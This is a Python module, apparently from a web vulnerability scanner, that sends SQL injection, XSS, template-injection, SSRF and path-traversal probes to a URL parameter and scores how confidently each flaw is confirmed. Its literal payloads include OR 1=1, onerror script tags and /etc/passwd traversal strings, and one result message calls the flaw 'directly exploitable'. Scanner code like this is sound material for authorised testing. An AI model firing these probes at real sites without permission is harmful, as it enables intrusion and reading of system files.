import hashlib
import re
import statistics
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional

import requests

from tools.log_utils import get_logger
from tools.payload_engine import (
    generate_sqli_boolean,
    generate_sqli_error,
    generate_sqli_time,
    generate_sqli_union,
)

logger = get_logger("enhanced_verify")

MARKER = "__verify_%s_%d__"


@dataclass
class VerifyResult:
    vuln_type: str
    confirmed: bool
    confidence: float = 0.0
    methods_passed: int = 0
    methods_total: int = 0
    payload_diversity: float = 0.0
    evidence: List[Dict] = field(default_factory=list)
    false_positive_risk: str = "low"
    recommendation: str = ""


class EnhancedVerifier:
    def __init__(self, sess: requests.Session, timeout: float = 10.0):
        self.sess = sess
        self.timeout = timeout

    def verify_sqli(self, url: str, param: str, original_result: Dict) -> VerifyResult:
        result = VerifyResult(vuln_type="sqli", confirmed=False)
        methods = []

        marker = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        magic_value = "verify_%s" % marker
        invert_value = "verify_%s_invert" % marker

        baseline = self._send_payload(url, param, magic_value)
        invert_baseline = self._send_payload(url, param, invert_value)
        if baseline and invert_baseline:
            if self._responses_differ(baseline, invert_baseline):
                methods.append({"method": "value_differential", "passed": True})

        error_payloads = generate_sqli_error(count=3)
        for i, payload in enumerate(error_payloads[:3]):
            resp = self._send_payload(url, param, payload)
            if resp and self._has_sql_error(resp.text):
                methods.append({"method": "error_based_%d" % i, "passed": True})

        boolean_payloads = generate_sqli_boolean(count=4)
        bool_results = []
        for payload in boolean_payloads[:4]:
            resp = self._send_payload(url, param, payload)
            if resp:
                bool_results.append(resp)
        if len(bool_results) >= 2:
            diffs = sum(1 for i in range(len(bool_results) - 1)
                       if self._responses_differ(bool_results[i], bool_results[i + 1]))
            if diffs >= 1:
                methods.append({"method": "boolean_differential", "passed": True})

        time_payloads = generate_sqli_time(count=2)
        for payload in time_payloads[:2]:
            start = time.time()
            self._send_payload(url, param, payload)
            elapsed = time.time() - start
            if elapsed > self.timeout * 0.8:
                methods.append({"method": "time_based", "passed": True})
                break

        marker_path = hashlib.md5(("path_" + marker).encode()).hexdigest()[:8]
        path_payload = "' OR 1=1--"
        normal_path = self._send_with_path(url, param, "test")
        marker_path_resp = self._send_with_path(url, param, path_payload)
        if normal_path and marker_path_resp:
            if self._responses_differ(normal_path, marker_path_resp):
                methods.append({"method": "path_differential", "passed": True})

        union_payloads = generate_sqli_union(count=2)
        for payload in union_payloads[:2]:
            resp = self._send_payload(url, param, payload)
            if resp and len(resp.text) > 100:
                methods.append({"method": "union_probe", "passed": True})
                break

        result.methods_total = 6
        result.methods_passed = len(methods)
        result.evidence = methods

        if result.methods_passed >= 4:
            result.confirmed = True
            result.confidence = 0.95
            result.false_positive_risk = "very_low"
            result.recommendation = "漏洞高度确认，可直接利用"
        elif result.methods_passed >= 2:
            result.confirmed = True
            result.confidence = 0.80
            result.false_positive_risk = "low"
            result.recommendation = "漏洞较确认，建议进一步验证"
        elif result.methods_passed >= 1:
            result.confirmed = False
            result.confidence = 0.50
            result.false_positive_risk = "medium"
            result.recommendation = "疑似漏洞，需要人工确认"
        else:
            result.confirmed = False
            result.confidence = 0.10
            result.false_positive_risk = "high"
            result.recommendation = "可能是误报"

        return result

    def verify_xss(self, url: str, param: str, original_result: Dict) -> VerifyResult:
        result = VerifyResult(vuln_type="xss", confirmed=False)
        methods = []
        marker = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

        test_cases = [
            ("<script>var x%d=1</script>" % hash(marker), "script_tag"),
            ("<img src=x onerror=alert(1)>", "event_handler"),
            ("javascript:alert(1)", "javascript_uri"),
            ("'onmouseover='alert(1)", "attribute_inject"),
            ("<svg/onload=alert(1)>", "svg_event"),
        ]

        for payload, desc in test_cases:
            resp = self._send_payload(url, param, payload)
            if resp and payload[:20] in resp.text:
                methods.append({"method": "reflection_%s" % desc, "passed": True})

        for payload, desc in test_cases[:3]:
            inverted = payload[::-1]
            resp = self._send_payload(url, param, inverted)
            if resp and inverted[:20] in resp.text:
                methods.append({"method": "reflection_%s_control" % desc, "passed": True})
                break

        result.methods_total = 6
        result.methods_passed = len(methods)
        result.evidence = methods

        if result.methods_passed >= 3:
            result.confirmed = True
            result.confidence = 0.90
            result.false_positive_risk = "low"
        elif result.methods_passed >= 2:
            result.confirmed = True
            result.confidence = 0.75
            result.false_positive_risk = "medium"
        else:
            result.confirmed = False
            result.confidence = 0.40
            result.false_positive_risk = "high"

        return result

    def verify_ssti(self, url: str, param: str, original_result: Dict) -> VerifyResult:
        result = VerifyResult(vuln_type="ssti", confirmed=False)
        methods = []
        marker = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

        math_exprs = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("<%= 7*7 %>", "49"),
            ("#{7*7}", "49"),
            ("{{7+'7'}}", "77"),
        ]

        for expr, expected in math_exprs:
            resp = self._send_payload(url, param, expr)
            if resp and expected in resp.text:
                methods.append({"method": "math_eval_%s" % expr[:10], "passed": True})

        for expr, expected in math_exprs[:2]:
            ctrl_expr = expr.replace("7", "8")
            ctrl_expected = expected.replace("49", "64").replace("77", "88")
            resp = self._send_payload(url, param, ctrl_expr)
            if resp and ctrl_expected in resp.text:
                methods.append({"method": "math_eval_control", "passed": True})
                break

        result.methods_total = 6
        result.methods_passed = len(methods)
        result.evidence = methods

        if result.methods_passed >= 3:
            result.confirmed = True
            result.confidence = 0.92
            result.false_positive_risk = "low"
        elif result.methods_passed >= 2:
            result.confirmed = True
            result.confidence = 0.80
            result.false_positive_risk = "low"
        else:
            result.confirmed = False
            result.confidence = 0.35
            result.false_positive_risk = "high"

        return result

    def verify_ssrf(self, url: str, param: str, original_result: Dict) -> VerifyResult:
        result = VerifyResult(vuln_type="ssrf", confirmed=False)
        methods = []

        marker = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        callback_url = "http://%s/callback_%s" % ("example.com", marker)

        resp1 = self._send_payload(url, param, callback_url)
        if resp1:
            methods.append({"method": "callback_probe", "passed": True})

        internal_targets = [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://[::1]/",
        ]
        for target in internal_targets:
            resp = self._send_payload(url, param, target)
            if resp and resp.status_code not in (0, 502, 503):
                methods.append({"method": "internal_access_%s" % target.split("//")[1][:10], "passed": True})
                break

        non_routable = "http://192.0.2.1/"
        resp = self._send_payload(url, param, non_routable)
        ctrl_resp = self._send_payload(url, param, "http://example.com/")
        if resp and ctrl_resp:
            if not self._responses_differ(resp, ctrl_resp):
                methods.append({"method": "non_routable_control", "passed": True})

        result.methods_total = 5
        result.methods_passed = len(methods)
        result.evidence = methods

        if result.methods_passed >= 3:
            result.confirmed = True
            result.confidence = 0.90
            result.false_positive_risk = "low"
        elif result.methods_passed >= 2:
            result.confirmed = True
            result.confidence = 0.75
            result.false_positive_risk = "medium"
        else:
            result.confirmed = False
            result.confidence = 0.45
            result.false_positive_risk = "high"

        return result

    def verify_lfi(self, url: str, param: str, original_result: Dict) -> VerifyResult:
        result = VerifyResult(vuln_type="lfi", confirmed=False)
        methods = []

        lfi_probes = [
            ("../../../../etc/passwd", "root:"),
            ("../../../../etc/hostname", ""),
            ("....//....//....//etc/passwd", "root:"),
            ("/etc/passwd", "root:"),
            ("php://filter/convert.base64-encode/resource=/etc/passwd", "cmVvb3Q6"),
        ]

        for payload, marker in lfi_probes:
            resp = self._send_payload(url, param, payload)
            if resp and (marker in resp.text if marker else len(resp.text) > 100):
                methods.append({"method": "path_traversal_%s" % payload[:20], "passed": True})

        ctrl_payload = "../../../../etc/nonexistent_file_xyz"
        resp = self._send_payload(url, param, ctrl_payload)
        if resp and resp.status_code == 404:
            methods.append({"method": "nonexistent_file_control", "passed": True})

        result.methods_total = 5
        result.methods_passed = len(methods)
        result.evidence = methods

        if result.methods_passed >= 3:
            result.confirmed = True
            result.confidence = 0.90
            result.false_positive_risk = "low"
        elif result.methods_passed >= 2:
            result.confirmed = True
            result.confidence = 0.80
            result.false_positive_risk = "low"
        else:
            result.confirmed = False
            result.confidence = 0.40
            result.false_positive_risk = "high"

        return result

    def _send_payload(self, url: str, param: str, payload: str) -> Optional[requests.Response]:
        try:
            test_url = url.replace(param + "=", param + "=" + requests.utils.quote(payload, safe=""))
            return self.sess.get(test_url, timeout=self.timeout, verify=False)
        except Exception:
            return None

    def _send_with_path(self, url: str, param: str, value: str) -> Optional[requests.Response]:
        try:
            test_url = url.replace(param + "=", param + "=" + value)
            return self.sess.get(test_url, timeout=self.timeout, verify=False)
        except Exception:
            return None

    def _responses_differ(self, r1: requests.Response, r2: requests.Response) -> bool:
        if r1.status_code != r2.status_code:
            return True
        h1 = hashlib.md5(r1.text.encode()).hexdigest()
        h2 = hashlib.md5(r2.text.encode()).hexdigest()
        return h1 != h2

    def _has_sql_error(self, text: str) -> bool:
        sql_errors = [
            r"SQL syntax", r"MySQL", r"ORA-\d{5}", r"PostgreSQL",
            r"SQLite", r"Microsoft.*SQL", r"Unclosed quotation",
            r"syntax error", r"mysql_fetch", r"Warning.*mysql",
        ]
        for pat in sql_errors:
            if re.search(pat, text, re.IGNORECASE):
                return True
        return False
